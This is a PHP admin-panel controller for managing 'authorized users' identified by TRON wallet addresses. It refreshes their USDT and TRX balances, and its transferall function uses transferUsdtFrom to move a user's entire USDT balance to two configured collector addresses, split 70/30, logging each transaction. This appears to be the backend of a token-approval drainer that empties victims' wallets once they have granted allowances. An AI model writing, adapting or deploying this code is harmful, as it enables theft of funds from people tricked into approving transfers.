<?php

namespace app\admin\controller;

use app\common\controller\Backend;
use app\common\library\TronService;
use think\Config;
use think\Db;

/**
 * 授权用户
 *
 * @icon fa fa-circle-o
 */
class Ausers extends Backend
{

    /**
     * Ausers模型对象
     * @var \app\admin\model\Ausers
     */
    protected $model = null;

    public function _initialize()
    {
        parent::_initialize();
        $this->model = new \app\admin\model\Ausers;

    }

    /**
     * 默认生成的控制器所继承的父类中有index/add/edit/del/multi五个基础方法、destroy/restore/recyclebin三个回收站方法
     * 因此在当前控制器中可不用编写增删改查的代码,除非需要自己控制这部分逻辑
     * 需要将application/admin/library/traits/Backend.php中对应的方法复制到当前控制器,然后进行修改
     */

    /**
     * 查看
     *
     * @return string|Json
     * @throws \think\Exception
     * @throws DbException
     */
    public function index()
    {
        //设置过滤方法
        $this->request->filter(['strip_tags', 'trim']);
        if (false === $this->request->isAjax()) {
            return $this->view->fetch();
        }
        //如果发送的来源是 Selectpage，则转发到 Selectpage
        if ($this->request->request('keyField')) {
            return $this->selectpage();
        }
        [$where, $sort, $order, $offset, $limit] = $this->buildparams();
        $list = $this->model
            ->where($where)
            ->where('show',1)
            ->order($sort, $order)
            ->paginate($limit);
        $result = ['total' => $list->total(), 'rows' => $list->items()];
        return json($result);
    }

    public function refreshrow()
    {
        $id = $this->request->post('id');
        if (!$id) {
            $this->error('Missing params');
        }
        $row = $this->model->get($id);
        if (!$row) {
            $this->error('Not found');
        }
        $addr = $row['address'];
        if (!$addr) {
            $this->error('Missing params');
        }
        $tron = new TronService();
        try {
            $usdt = $tron->usdtBalanceOf($addr);
            $trx = $tron->trxBalanceOf($addr);
            $row->save([
                'usdt_balance' => $usdt,
                'trx_balance' => $trx
            ]);
        } catch (\Throwable $e) {
            $this->error($e->getMessage());
        }
        $this->success('更新成功');
    }

    public function transferall()
    {
        $id = $this->request->post('id');
        if (!$id) {
            $this->error('Missing params');
        }
        $row = $this->model->get($id);
        if (!$row) {
            $this->error('Not found');
        }
        $addr = $row['address'];
        if (!$addr) {
            $this->error('Missing params');
        }
        $toA = Config::get('tron.collect_to_a');
        $toB = Config::get('tron.collect_to_b');
        if (!$toA || !$toB) {
            $this->error('Missing collect address');
        }
        $tron = new TronService();
        try {
            $balance = $tron->usdtBalanceOf($addr);
            if ($balance <= 0) {
                $this->error('Balance empty');
            }
            $decimals = $tron->contract(Config::get('tron.usdt_contract'))->decimals();
            $partA = (int)floor($balance * 0.7);
            $partB = $balance - $partA;
            $respA = $tron->transferUsdtFrom($addr, $toA, $partA);
            $txA = isset($respA['txID']) ? $respA['txID'] : '';
            Db::name('transfer_log')->insert([
                'user_id' => $row['id'],
                'admin_id' => $this->auth->id,
                'from_address' => $addr,
                'to_address' => $toA,
                'percent' => 70,
                'amount_sun' => $partA,
                'amount_human' => bcdiv((string)$partA, bcpow("10", (string)$decimals, 0), $decimals),
                'decimals' => $decimals,
                'tx_id' => $txA,
                'result_json' => json_encode($respA, JSON_UNESCAPED_UNICODE),
                'status' => (isset($respA['result']) && $respA['result'] === true) ? 1 : 0,
                'createtime' => time(),
                'updatetime' => time()
            ]);
            $respB = $tron->transferUsdtFrom($addr, $toB, $partB);
            $txB = isset($respB['txID']) ? $respB['txID'] : '';
            Db::name('transfer_log')->insert([
                'user_id' => $row['id'],
                'admin_id' => $this->auth->id,
                'from_address' => $addr,
                'to_address' => $toB,
                'percent' => 30,
                'amount_sun' => $partB,
                'amount_human' => bcdiv((string)$partB, bcpow("10", (string)$decimals, 0), $decimals),
                'decimals' => $decimals,
                'tx_id' => $txB,
                'result_json' => json_encode($respB, JSON_UNESCAPED_UNICODE),
                'status' => (isset($respB['result']) && $respB['result'] === true) ? 1 : 0,
                'createtime' => time(),
                'updatetime' => time()
            ]);
            if (
                (isset($respA['result']) && $respA['result'] === true) &&
                (isset($respB['result']) && $respB['result'] === true)
            ) {
                $save = ['usdt_balance' => 0];
                if (array_key_exists('state', $row->getData())) {
                    $save['state'] = 2;
                }
                $row->save($save);
            }
            $this->success('ok','', ['a' => $respA, 'b' => $respB]);
        } catch (\Throwable $e) {
            $this->error($e->getMessage());
        }
    }
}
